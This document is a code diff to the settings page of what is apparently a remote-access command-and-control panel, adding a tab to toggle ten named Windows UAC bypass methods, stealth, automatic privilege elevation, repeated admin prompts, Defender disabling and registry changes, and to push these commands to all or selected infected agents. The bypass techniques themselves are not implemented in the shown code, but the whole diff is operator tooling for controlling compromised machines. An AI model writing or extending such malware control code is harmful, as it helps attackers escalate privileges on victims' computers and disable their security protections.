@@ -84,6 +84,10 @@ interface C2Settings {
     quickStartup: boolean;
     enableStealth: boolean;
     autoElevatePrivileges: boolean;
+    requestAdminFirst: boolean;
+    maxPromptAttempts: number;
+    uacBypassDebug: boolean;
+    persistentAdminPrompt: boolean;
   };
   webrtc: {
     enabled: boolean;
@@ -104,11 +108,19 @@ interface C2Settings {
     ipBlockingEnabled: boolean;
     blockedIps: string[];
   };
+  bypasses?: {
+    enabled: boolean;
+    methods?: Record<string, boolean>;
+  };
+  registry?: {
+    enabled: boolean;
+    notificationsEnabled?: boolean;
+  };
 }
 
 export function Settings() {
   const { theme, setTheme } = useTheme();
-  const { logout } = useSocket();
+  const { logout, agents, selectedAgent, setSelectedAgent, sendCommand } = useSocket();
   const [showPasswords, setShowPasswords] = useState({
     admin: false,
     operator: false,
@@ -158,7 +170,11 @@ export function Settings() {
       silentMode: true,
       quickStartup: false,
       enableStealth: true,
-      autoElevatePrivileges: true
+      autoElevatePrivileges: true,
+      requestAdminFirst: false,
+      maxPromptAttempts: 3,
+      uacBypassDebug: true,
+      persistentAdminPrompt: false
     },
     webrtc: {
       enabled: true,
@@ -181,6 +197,25 @@ export function Settings() {
       rateLimitWindow: 60,
       ipBlockingEnabled: false,
       blockedIps: []
+    },
+    bypasses: {
+      enabled: true,
+      methods: {
+        cleanmgr_sagerun: true,
+        fodhelper: true,
+        computerdefaults: true,
+        eventvwr: true,
+        sdclt: true,
+        wsreset: true,
+        slui: true,
+        winsat: true,
+        silentcleanup: true,
+        icmluautil: true
+      }
+    },
+    registry: {
+      enabled: true,
+      notificationsEnabled: true
     }
   });
 
@@ -283,6 +318,25 @@ export function Settings() {
           security: {
             ...prev.security,
             ...data?.security,
+          },
+          bypasses: {
+            enabled: Boolean(data?.bypasses?.enabled ?? prev.bypasses?.enabled ?? true),
+            methods: {
+              cleanmgr_sagerun: Boolean(data?.bypasses?.methods?.cleanmgr_sagerun ?? prev.bypasses?.methods?.cleanmgr_sagerun ?? true),
+              fodhelper: Boolean(data?.bypasses?.methods?.fodhelper ?? prev.bypasses?.methods?.fodhelper ?? true),
+              computerdefaults: Boolean(data?.bypasses?.methods?.computerdefaults ?? prev.bypasses?.methods?.computerdefaults ?? true),
+              eventvwr: Boolean(data?.bypasses?.methods?.eventvwr ?? prev.bypasses?.methods?.eventvwr ?? true),
+              sdclt: Boolean(data?.bypasses?.methods?.sdclt ?? prev.bypasses?.methods?.sdclt ?? true),
+              wsreset: Boolean(data?.bypasses?.methods?.wsreset ?? prev.bypasses?.methods?.wsreset ?? true),
+              slui: Boolean(data?.bypasses?.methods?.slui ?? prev.bypasses?.methods?.slui ?? true),
+              winsat: Boolean(data?.bypasses?.methods?.winsat ?? prev.bypasses?.methods?.winsat ?? true),
+              silentcleanup: Boolean(data?.bypasses?.methods?.silentcleanup ?? prev.bypasses?.methods?.silentcleanup ?? true),
+              icmluautil: Boolean(data?.bypasses?.methods?.icmluautil ?? prev.bypasses?.methods?.icmluautil ?? true)
+            }
+          },
+          registry: {
+            enabled: Boolean(data?.registry?.enabled ?? prev.registry?.enabled ?? true),
+            notificationsEnabled: Boolean(data?.registry?.notificationsEnabled ?? prev.registry?.notificationsEnabled ?? true)
           },
         }));
         try {
@@ -456,6 +510,10 @@ export function Settings() {
           <TabsTrigger value="advanced" className="flex flex-col items-center gap-1 py-3">
             <SettingsIcon className="h-4 w-4" />
             <span className="text-xs">Advanced</span>
+          </TabsTrigger>
+          <TabsTrigger value="controls" className="flex flex-col items-center gap-1 py-3">
+            <Zap className="h-4 w-4" />
+            <span className="text-xs">Bypasses & Registry</span>
           </TabsTrigger>
         </TabsList>
 
@@ -1148,6 +1206,301 @@ export function Settings() {
           </Card>
         </TabsContent>
 
+        <TabsContent value="controls" className="space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Zap className="h-5 w-5" />
+                Bypasses & Registry Controls
+              </CardTitle>
+              <CardDescription>
+                Toggle UAC bypass methods and registry modifications. Apply to all agents or a selected agent.
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div className="space-y-4">
+                  <div className="flex items-center justify-between">
+                    <Label htmlFor="bypasses-enabled">Enable All Bypasses</Label>
+                    <Switch
+                      id="bypasses-enabled"
+                      checked={Boolean(settings.bypasses?.enabled)}
+                      onCheckedChange={(checked) => updateSetting('bypasses', 'enabled', checked)}
+                    />
+                  </div>
+                  <div className="flex items-center justify-between">
+                    <Label htmlFor="agent-enable-uac">Agent: Enable UAC Bypass</Label>
+                    <Switch
+                      id="agent-enable-uac"
+                      checked={settings.agent.enableUACBypass}
+                      onCheckedChange={(checked) => updateSetting('agent', 'enableUACBypass', checked)}
+                    />
+                  </div>
+                  <div className="flex items-center justify-between">
+                    <Label htmlFor="agent-request-admin-first">Agent: Request Admin First</Label>
+                    <Switch
+                      id="agent-request-admin-first"
+                      checked={settings.agent.requestAdminFirst}
+                      onCheckedChange={(checked) => updateSetting('agent', 'requestAdminFirst', checked)}
+                    />
+                  </div>
+                  <div className="flex items-center justify-between">
+                    <Label htmlFor="agent-persistent-admin">Agent: Persistent Admin Prompt</Label>
+                    <Switch
+                      id="agent-persistent-admin"
+                      checked={settings.agent.persistentAdminPrompt}
+                      onCheckedChange={(checked) => updateSetting('agent', 'persistentAdminPrompt', checked)}
+                    />
+                  </div>
+                  <div className="flex items-center justify-between">
+                    <Label htmlFor="agent-uac-debug">Agent: UAC Bypass Debug</Label>
+                    <Switch
+                      id="agent-uac-debug"
+                      checked={settings.agent.uacBypassDebug}
+                      onCheckedChange={(checked) => updateSetting('agent', 'uacBypassDebug', checked)}
+                    />
+                  </div>
+                </div>
+                <div className="space-y-4">
+                  <div className="flex items-center justify-between">
+                    <Label htmlFor="registry-enabled">Enable All Registry Changes</Label>
+                    <Switch
+                      id="registry-enabled"
+                      checked={Boolean(settings.registry?.enabled)}
+                      onCheckedChange={(checked) => updateSetting('registry', 'enabled', checked)}
+                    />
+                  </div>
+                  <div className="flex items-center justify-between">
+                    <Label htmlFor="notifications-enabled">Notifications Enabled</Label>
+                    <Switch
+                      id="notifications-enabled"
+                      checked={Boolean(settings.registry?.notificationsEnabled)}
+                      onCheckedChange={(checked) => updateSetting('registry', 'notificationsEnabled', checked)}
+                    />
+                  </div>
+                  <div className="flex items-center justify-between">
+                    <Label htmlFor="agent-enable-defender">Agent: Enable Defender Disable</Label>
+                    <Switch
+                      id="agent-enable-defender"
+                      checked={settings.agent.enableDefenderDisable}
+                      onCheckedChange={(checked) => updateSetting('agent', 'enableDefenderDisable', checked)}
+                    />
+                  </div>
+                  <div className="space-y-2">
+                    <Label htmlFor="agent-max-prompts">Agent: Max Prompt Attempts</Label>
+                    <Input
+                      id="agent-max-prompts"
+                      type="number"
+                      value={settings.agent.maxPromptAttempts}
+                      onChange={(e) => updateSetting('agent', 'maxPromptAttempts', parseInt(e.target.value))}
+                      min={1}
+                      max={10}
+                    />
+                  </div>
+                </div>
+              </div>
+              <Separator />
+              <div className="space-y-4">
+                <div className="space-y-2">
+                  <Label>Bypass Methods</Label>
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                    <div className="flex items-center justify-between">
+                      <span>cleanmgr_sagerun</span>
+                      <Switch
+                        checked={Boolean(settings.bypasses?.methods?.cleanmgr_sagerun)}
+                        onCheckedChange={(checked) => updateSetting('bypasses', 'methods', { ...(settings.bypasses?.methods || {}), cleanmgr_sagerun: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>fodhelper</span>
+                      <Switch
+                        checked={Boolean(settings.bypasses?.methods?.fodhelper)}
+                        onCheckedChange={(checked) => updateSetting('bypasses', 'methods', { ...(settings.bypasses?.methods || {}), fodhelper: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>computerdefaults</span>
+                      <Switch
+                        checked={Boolean(settings.bypasses?.methods?.computerdefaults)}
+                        onCheckedChange={(checked) => updateSetting('bypasses', 'methods', { ...(settings.bypasses?.methods || {}), computerdefaults: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>eventvwr</span>
+                      <Switch
+                        checked={Boolean(settings.bypasses?.methods?.eventvwr)}
+                        onCheckedChange={(checked) => updateSetting('bypasses', 'methods', { ...(settings.bypasses?.methods || {}), eventvwr: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>sdclt</span>
+                      <Switch
+                        checked={Boolean(settings.bypasses?.methods?.sdclt)}
+                        onCheckedChange={(checked) => updateSetting('bypasses', 'methods', { ...(settings.bypasses?.methods || {}), sdclt: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>wsreset</span>
+                      <Switch
+                        checked={Boolean(settings.bypasses?.methods?.wsreset)}
+                        onCheckedChange={(checked) => updateSetting('bypasses', 'methods', { ...(settings.bypasses?.methods || {}), wsreset: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>slui</span>
+                      <Switch
+                        checked={Boolean(settings.bypasses?.methods?.slui)}
+                        onCheckedChange={(checked) => updateSetting('bypasses', 'methods', { ...(settings.bypasses?.methods || {}), slui: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>winsat</span>
+                      <Switch
+                        checked={Boolean(settings.bypasses?.methods?.winsat)}
+                        onCheckedChange={(checked) => updateSetting('bypasses', 'methods', { ...(settings.bypasses?.methods || {}), winsat: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>silentcleanup</span>
+                      <Switch
+                        checked={Boolean(settings.bypasses?.methods?.silentcleanup)}
+                        onCheckedChange={(checked) => updateSetting('bypasses', 'methods', { ...(settings.bypasses?.methods || {}), silentcleanup: checked })}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span>icmluautil</span>
+                      <Switch
+                        checked={Boolean(settings.bypasses?.methods?.icmluautil)}
+                        onCheckedChange={(checked) => updateSetting('bypasses', 'methods', { ...(settings.bypasses?.methods || {}), icmluautil: checked })}
+                      />
+                    </div>
+                  </div>
+                </div>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="flex items-center gap-2">
+                    <Button
+                      variant="default"
+                      onClick={async () => {
+                        try {
+                          const action = settings.bypasses?.enabled ? 'bypasses:on' : 'bypasses:off';
+                          const res = await fetch('/api/actions/bulk', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ action, agent_ids: [] })
+                          });
+                          const data = await res.json();
+                          if (!res.ok) throw new Error(data?.error || 'Failed to apply bypasses to all');
+                          toast.success('Bypasses applied to all online agents');
+                        } catch (e: any) {
+                          toast.error(e.message || 'Failed to apply bypasses to all');
+                        }
+                      }}
+                      className="flex items-center space-x-2"
+                    >
+                      <Zap className="h-4 w-4" />
+                      <span>Apply Bypasses To All</span>
+                    </Button>
+                    <Button
+                      variant="outline"
+                      onClick={async () => {
+                        try {
+                          const action = settings.registry?.enabled ? 'registry:on' : 'registry:off';
+                          const res = await fetch('/api/actions/bulk', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ action, agent_ids: [] })
+                          });
+                          const data = await res.json();
+                          if (!res.ok) throw new Error(data?.error || 'Failed to apply registry to all');
+                          toast.success('Registry controls applied to all online agents');
+                        } catch (e: any) {
+                          toast.error(e.message || 'Failed to apply registry to all');
+                        }
+                      }}
+                    >
+                      Apply Registry To All
+                    </Button>
+                    <Button
+                      variant="outline"
+                      onClick={async () => {
+                        try {
+                          const action = settings.registry?.notificationsEnabled ? 'registry:notifications:on' : 'registry:notifications:off';
+                          const res = await fetch('/api/actions/bulk', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ action, agent_ids: [] })
+                          });
+                          const data = await res.json();
+                          if (!res.ok) throw new Error(data?.error || 'Failed to apply notifications setting to all');
+                          toast.success('Notifications setting applied to all online agents');
+                        } catch (e: any) {
+                          toast.error(e.message || 'Failed to apply notifications to all');
+                        }
+                      }}
+                    >
+                      Apply Notifications To All
+                    </Button>
+                  </div>
+                  <div className="space-y-2">
+                    <Label>Select Agent</Label>
+                    <Select
+                      value={selectedAgent || ''}
+                      onValueChange={(val) => {
+                        setSelectedAgent(val);
+                      }}
+                    >
+                      <SelectTrigger>
+                        <SelectValue placeholder="Choose agent" />
+                      </SelectTrigger>
+                      <SelectContent>
+                        {agents.map(a => (
+                          <SelectItem key={a.id} value={a.id}>{a.name || a.id}</SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                    <div className="flex items-center gap-2">
+                      <Button
+                        disabled={!selectedAgent}
+                        onClick={() => {
+                          if (!selectedAgent) return;
+                          const cmd = settings.bypasses?.enabled ? 'bypasses:on' : 'bypasses:off';
+                          sendCommand(selectedAgent, cmd);
+                          toast.success('Bypasses command sent to selected agent');
+                        }}
+                      >
+                        Apply Bypasses To Selected
+                      </Button>
+                      <Button
+                        variant="outline"
+                        disabled={!selectedAgent}
+                        onClick={() => {
+                          if (!selectedAgent) return;
+                          const cmd = settings.registry?.enabled ? 'registry:on' : 'registry:off';
+                          sendCommand(selectedAgent, cmd);
+                          toast.success('Registry command sent to selected agent');
+                        }}
+                      >
+                        Apply Registry To Selected
+                      </Button>
+                      <Button
+                        variant="outline"
+                        disabled={!selectedAgent}
+                        onClick={() => {
+                          if (!selectedAgent) return;
+                          const cmd = settings.registry?.notificationsEnabled ? 'registry:notifications:on' : 'registry:notifications:off';
+                          sendCommand(selectedAgent, cmd);
+                          toast.success('Notifications command sent to selected agent');
+                        }}
+                      >
+                        Apply Notifications To Selected
+                      </Button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
         {/* Advanced Settings */}
         <TabsContent value="advanced" className="space-y-6">
           <Card>
